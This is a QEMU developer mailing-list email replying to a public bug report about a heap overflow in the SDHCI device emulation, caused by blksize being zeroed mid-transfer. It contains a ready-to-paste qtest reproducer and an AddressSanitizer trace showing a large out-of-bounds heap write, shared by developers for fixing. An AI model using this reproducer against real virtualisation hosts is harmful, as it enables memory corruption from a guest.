Return-Path: <qemu-devel-bounces+lists+qemu-devel=lfdr.de@nongnu.org>
X-Original-To: lists+qemu-devel@lfdr.de
Delivered-To: lists+qemu-devel@lfdr.de
Received: from lists.gnu.org (lists.gnu.org [209.51.188.17])
	by mail.lfdr.de (Postfix) with ESMTPS id 85B38308313
	for <lists+qemu-devel@lfdr.de>; Fri, 29 Jan 2021 02:15:37 +0100 (CET)
Received: from localhost ([::1]:37312 helo=lists1p.gnu.org)
	by lists.gnu.org with esmtp (Exim 4.90_1)
	(envelope-from <qemu-devel-bounces+lists+qemu-devel=lfdr.de@nongnu.org>)
	id 1l5INs-0002x2-K0
	for lists+qemu-devel@lfdr.de; Thu, 28 Jan 2021 20:15:36 -0500
Received: from eggs.gnu.org ([2001:470:142:3::10]:56582)
 by lists.gnu.org with esmtps (TLS1.2:ECDHE_RSA_AES_256_GCM_SHA384:256)
 (Exim 4.90_1) (envelope-from <alxndr@bu.edu>) id 1l5ILv-0002Sh-QO
 for qemu-devel@nongnu.org; Thu, 28 Jan 2021 20:13:35 -0500
Received: from relay64.bu.edu ([128.197.228.104]:51840)
 by eggs.gnu.org with esmtps (TLS1.2:ECDHE_RSA_AES_256_GCM_SHA384:256)
 (Exim 4.90_1) (envelope-from <alxndr@bu.edu>) id 1l5ILt-00075x-Mj
 for qemu-devel@nongnu.org; Thu, 28 Jan 2021 20:13:35 -0500
X-Envelope-From: alxndr@bu.edu
X-BU-AUTH: mozz.bu.edu [128.197.127.33]
Received: from BU-AUTH (localhost.localdomain [127.0.0.1]) (authenticated
 bits=0)
 by relay64.bu.edu (8.14.3/8.14.3) with ESMTP id 10T1CJiJ027573
 (version=TLSv1/SSLv3 cipher=AES256-GCM-SHA384 bits=256 verify=NO);
 Thu, 28 Jan 2021 20:12:22 -0500
Date: Thu, 28 Jan 2021 20:12:19 -0500
From: Alexander Bulekov <alxndr@bu.edu>
To: Bug 1909418 <1909418@bugs.launchpad.net>
Subject: Re: [Bug 1909418] Re: QEMU: Heap Overflow vulnerability in SDHCI
 Component
Message-ID: <20210129011219.yn3cwaezbh5nqzhb@mozz.bu.edu>
References: <160912329727.12976.15863513564495586079.malonedeb@chaenomeles.canonical.com>
 <160998886263.4814.8157964636140792682.launchpad@chaenomeles.canonical.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <160998886263.4814.8157964636140792682.launchpad@chaenomeles.canonical.com>
Received-SPF: pass client-ip=128.197.228.104; envelope-from=alxndr@bu.edu;
 helo=relay64.bu.edu
X-Spam_score_int: -15
X-Spam_score: -1.6
X-Spam_bar: -
X-Spam_report: (-1.6 / 5.0 requ) BAYES_00=-1.9, HK_RANDOM_ENVFROM=0.001,
 HK_RANDOM_FROM=0.999, RCVD_IN_DNSWL_LOW=-0.7, SPF_HELO_NONE=0.001,
 SPF_PASS=-0.001 autolearn=no autolearn_force=no
X-Spam_action: no action
X-BeenThere: qemu-devel@nongnu.org
X-Mailman-Version: 2.1.23
Precedence: list
List-Id: <qemu-devel.nongnu.org>
List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
List-Archive: <https://lists.nongnu.org/archive/html/qemu-devel>
List-Post: <mailto:qemu-devel@nongnu.org>
List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=subscribe>
Cc: qemu-devel@nongnu.org,
 Philippe =?utf-8?Q?Mathieu-Daud=C3=A9?= <f4bug@amsat.org>
Errors-To: qemu-devel-bounces+lists+qemu-devel=lfdr.de@nongnu.org
Sender: "Qemu-devel" <qemu-devel-bounces+lists+qemu-devel=lfdr.de@nongnu.org>

This was found by OSS-Fuzz as well. Yankable reproducer:

+CC Phil. I know you mentioned you don't have time to fix many of the
sdhci bugs, but this one seems like a large heap write, and the original
reporter provided some analysis.

On 210107 0307, Muhammad Ramdhan wrote:
> ** Information type changed from Private Security to Public Security
> 
> -- 
> You received this bug notification because you are a member of qemu-
> devel-ml, which is subscribed to QEMU.
> https://bugs.launchpad.net/bugs/1909418
> 
> Title:
>   QEMU: Heap Overflow vulnerability in SDHCI Component
> 
> Status in QEMU:
>   New
> 
> Bug description:
>   Hello, i want to report qemu vulnerability in SDHCI component, this is
>   integer overflow bug leads to oob read/write in the heap, that can
>   happens in sdhci_do_adma or sdhci_sdma_transfer_multi_blocks.
> 
>   This is caused when in the middle of unfinished transfer, blksize can
>   change, but the data_count still have the last offset of fifo_buffer
>   from the last transfer. We change blksize to zero, then in the next
>   transfer dma_memory_read/dma_memory_write in the first loop calculate
>   length as blksize-data_count, this leads to integer overflow, because
>   blksize is zero, and data_count can be more than zero.
> 
>   This bug is recorded in CVE-2020-25085, but the fix is not complete
>   and not fix the root cause of the bug.
>   Reproducer:

Changing this so it is yankable:

cat << EOF | ./qemu-system-i386 -display none -machine accel=qtest \
-m 512M -nodefaults -device sdhci-pci,sd-spec-version=3 \
-device sd-card,drive=mydrive \
-drive if=sd,index=0,file=null-co://,format=raw,id=mydrive \
-nographic -qtest stdio
outl 0xcf8 0x80001010
outl 0xcfc 0xd7055dba
outl 0xcf8 0x80001003
outl 0xcfc 0x86b1d733
write 0x00 0x1 0x29
write 0x02 0x1 0x10
write 0x08 0x1 0x39
writeb 0xd7055d2b 0x5e
writel 0xd7055d2c 0xed7d735
writew 0xd7055d30 0x126e
writeb 0xd7055d32 0x84
writel 0xd7055d24 0xd7346e01
writew 0xd7055d28 0x3bd7
writeb 0xd7055d2a 0x1
writeb 0xd7055d05 0x2c
writew 0xd7055d06 0x5c4
writeb 0xd7055d0c 0x21
writew 0xd7055d0e 0x846e
writel 0xd7055d04 0x260000
writew 0xd7055d08 0x0
writeb 0xd7055d0a 0x6d
writeb 0xd7055d0c 0x31
clock_step
EOF

-Alex

> 
>   ➜  x86_64-softmmu git:(master) ✗ ./qemu-system-x86_64 -m 4G -nodefaults -trace 'sdhci*' -device sdhci-pci,sd-spec-version=3 -device sd-card,drive=mydrive -drive if=sd,index=0,file=null-co://,format=raw,id=mydrive -nographic -qtest stdio -accel qtest
>   ==410717==WARNING: ASan doesn't fully support makecontext/swapcontext functions and may produce false positives in some cases!
>   [I 1609122395.789698] OPENED
>   qemu-system-x86_64: -drive if=sd,index=0,file=null-co://,format=raw,id=mydrive: warning: bogus if=sd is deprecated, use if=none
>   [R +0.037381] outl 0xcf8 0x80001010
>   [S +0.037436] OK
>   OK
>   [R +0.037470] outl 0xcfc 0xd7055dba
>   [S +0.037510] OK
>   OK
>   [R +0.037531] outl 0xcf8 0x80001003
>   [S +0.037549] OK
>   OK
>   [R +0.037571] outl 0xcfc 0x86b1d733
>   [S +0.039830] OK
>   OK
>   [R +0.039882] write 0x00 0x1 0x29
>   [S +0.040364] OK
>   OK
>   [R +0.040401] write 0x02 0x1 0x10
>   [S +0.040428] OK
>   OK
>   [R +0.040449] write 0x08 0x1 0x39
>   [S +0.040472] OK
>   OK
>   [R +0.040491] writeb 0xd7055d2b 0x5e
>   [S +0.040530] OK
>   OK
>   [R +0.040550] writel 0xd7055d2c 0xed7d735
>   [S +0.040575] OK
>   OK
>   [R +0.040594] writew 0xd7055d30 0x126e
>   [S +0.040620] OK
>   OK
>   [R +0.040638] writeb 0xd7055d32 0x84
>   [S +0.040658] OK
>   OK
>   [R +0.040676] writel 0xd7055d24 0xd7346e01
>   [S +0.040697] OK
>   OK
>   [R +0.040715] writew 0xd7055d28 0x3bd7
>   [S +0.040738] OK
>   OK
>   [R +0.040756] writeb 0xd7055d2a 0x1
>   [S +0.040779] OK
>   OK
>   [R +0.040797] writeb 0xd7055d05 0x2c
>   [S +0.040819] OK
>   OK
>   [R +0.040840] writew 0xd7055d06 0x5c4
>   [S +0.040862] OK
>   OK
>   [R +0.040882] writeb 0xd7055d0c 0x21
>   [S +0.040907] OK
>   OK
>   [R +0.040927] writew 0xd7055d0e 0x846e
>   [S +0.041026] OK
>   OK
>   [R +0.041054] writel 0xd7055d04 0x260000
>   [S +0.041115] OK
>   OK
>   [R +0.041139] writew 0xd7055d08 0x0
>   =================================================================
>   ==410717==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x615000024180 at pc 0x7fe40cb7457d bp 0x7fffa1a7b800 sp 0x7fffa1a7afa8
>   WRITE of size 786432 at 0x615000024180 thread T0
>       #0 0x7fe40cb7457c  (/lib/x86_64-linux-gnu/libasan.so.5+0x9b57c)
>       #1 0x55f804942120 in flatview_read_continue ../../softmmu/physmem.c:2829
>       #2 0x55f8049423dd in flatview_read ../../softmmu/physmem.c:2862
>       #3 0x55f804942581 in address_space_read_full ../../softmmu/physmem.c:2875
>       #4 0x55f804942800 in address_space_rw ../../softmmu/physmem.c:2903
>       #5 0x55f8038d6a92 in dma_memory_rw_relaxed /home/n0p/belajar/qemu/source/qemu/include/sysemu/dma.h:88
>       #6 0x55f8038d6adf in dma_memory_rw /home/n0p/belajar/qemu/source/qemu/include/sysemu/dma.h:127
>       #7 0x55f8038d6b17 in dma_memory_read /home/n0p/belajar/qemu/source/qemu/include/sysemu/dma.h:145
>       #8 0x55f8038e47d9 in sdhci_do_adma ../../hw/sd/sdhci.c:807
>       #9 0x55f8038e6081 in sdhci_data_transfer ../../hw/sd/sdhci.c:905
>       #10 0x55f8038e694c in sdhci_resume_pending_transfer ../../hw/sd/sdhci.c:962
>       #11 0x55f8038e9227 in sdhci_write ../../hw/sd/sdhci.c:1118
>       #12 0x55f804856869 in memory_region_write_accessor ../../softmmu/memory.c:491
>       #13 0x55f804856cf4 in access_with_adjusted_size ../../softmmu/memory.c:552
>       #14 0x55f804863f28 in memory_region_dispatch_write ../../softmmu/memory.c:1501
>       #15 0x55f8049419ce in flatview_write_continue ../../softmmu/physmem.c:2759
>       #16 0x55f804941da4 in flatview_write ../../softmmu/physmem.c:2799
>       #17 0x55f804942724 in address_space_write ../../softmmu/physmem.c:2891
>       #18 0x55f804a9bee3 in qtest_process_command ../../softmmu/qtest.c:529
>       #19 0x55f804aa0dea in qtest_process_inbuf ../../softmmu/qtest.c:797
>       #20 0x55f804aa0edb in qtest_read ../../softmmu/qtest.c:809
>       #21 0x55f804ffb687 in qemu_chr_be_write_impl ../../chardev/char.c:201
>       #22 0x55f804ffb731 in qemu_chr_be_write ../../chardev/char.c:213
>       #23 0x55f804fe5369 in fd_chr_read ../../chardev/char-fd.c:68
>       #24 0x55f804f9b2dd in qio_channel_fd_source_dispatch ../../io/channel-watch.c:84
>       #25 0x7fe40c548e8d in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x51e8d)
>       #26 0x55f80540b38e in glib_pollfds_poll ../../util/main-loop.c:221
>       #27 0x55f80540b56f in os_host_main_loop_wait ../../util/main-loop.c:244
>       #28 0x55f80540b871 in main_loop_wait ../../util/main-loop.c:520
>       #29 0x55f80478602b in qemu_main_loop ../../softmmu/runstate.c:720
>       #30 0x55f8038091c9 in main ../../softmmu/main.c:50
>       #31 0x7fe409dc80b2 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x270b2)
>       #32 0x55f8038090dd in _start (/home/n0p/belajar/qemu/source/qemu/bin/new/qemu-system-x86_64+0x28d10dd)
> 
>   0x615000024180 is located 0 bytes to the right of 512-byte region [0x615000023f80,0x615000024180)
>   allocated by thread T0 here:
>       #0 0x7fe40cbe6dc6 in calloc (/lib/x86_64-linux-gnu/libasan.so.5+0x10ddc6)
>       #1 0x7fe40c54ed30 in g_malloc0 (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x57d30)
>       #2 0x55f8040cd37b in sdhci_pci_realize ../../hw/sd/sdhci-pci.c:36
>       #3 0x55f80411c6f5 in pci_qdev_realize ../../hw/pci/pci.c:2124
>       #4 0x55f804fc7834 in device_set_realized ../../hw/core/qdev.c:761
>       #5 0x55f804f8002c in property_set_bool ../../qom/object.c:2251
>       #6 0x55f804f7a840 in object_property_set ../../qom/object.c:1399
>       #7 0x55f804f83419 in object_property_set_qobject ../../qom/qom-qobject.c:28
>       #8 0x55f804f7ae44 in object_property_set_bool ../../qom/object.c:1466
>       #9 0x55f804fc417a in qdev_realize ../../hw/core/qdev.c:389
>       #10 0x55f803da8bb7 in qdev_device_add ../../softmmu/qdev-monitor.c:665
>       #11 0x55f8047f5408 in device_init_func ../../softmmu/vl.c:1201
>       #12 0x55f8053d3644 in qemu_opts_foreach ../../util/qemu-option.c:1147
>       #13 0x55f8047fc593 in qemu_create_cli_devices ../../softmmu/vl.c:2488
>       #14 0x55f8047fc6fa in qmp_x_exit_preconfig ../../softmmu/vl.c:2527
>       #15 0x55f804801c8e in qemu_init ../../softmmu/vl.c:3534
>       #16 0x55f8038091c4 in main ../../softmmu/main.c:49
>       #17 0x7fe409dc80b2 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x270b2)
> 
>   SUMMARY: AddressSanitizer: heap-buffer-overflow (/lib/x86_64-linux-gnu/libasan.so.5+0x9b57c)
>   Shadow bytes around the buggy address:
>     0x0c2a7fffc7e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
>     0x0c2a7fffc7f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
>     0x0c2a7fffc800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
>     0x0c2a7fffc810: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
>     0x0c2a7fffc820: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
>   =>0x0c2a7fffc830:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
>     0x0c2a7fffc840: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
>     0x0c2a7fffc850: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
>     0x0c2a7fffc860: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
>     0x0c2a7fffc870: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
>     0x0c2a7fffc880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
>   Shadow byte legend (one shadow byte represents 8 application bytes):
>     Addressable:           00
>     Partially addressable: 01 02 03 04 05 06 07
>     Heap left redzone:       fa
>     Freed heap region:       fd
>     Stack left redzone:      f1
>     Stack mid redzone:       f2
>     Stack right redzone:     f3
>     Stack after return:      f5
>     Stack use after scope:   f8
>     Global redzone:          f9
>     Global init order:       f6
>     Poisoned by user:        f7
>     Container overflow:      fc
>     Array cookie:            ac
>     Intra object redzone:    bb
>     ASan internal:           fe
>     Left alloca redzone:     ca
>     Right alloca redzone:    cb
>     Shadow gap:              cc
>   ==410717==ABORTING
> 
> To manage notifications about this bug go to:
> https://bugs.launchpad.net/qemu/+bug/1909418/+subscriptions
> 

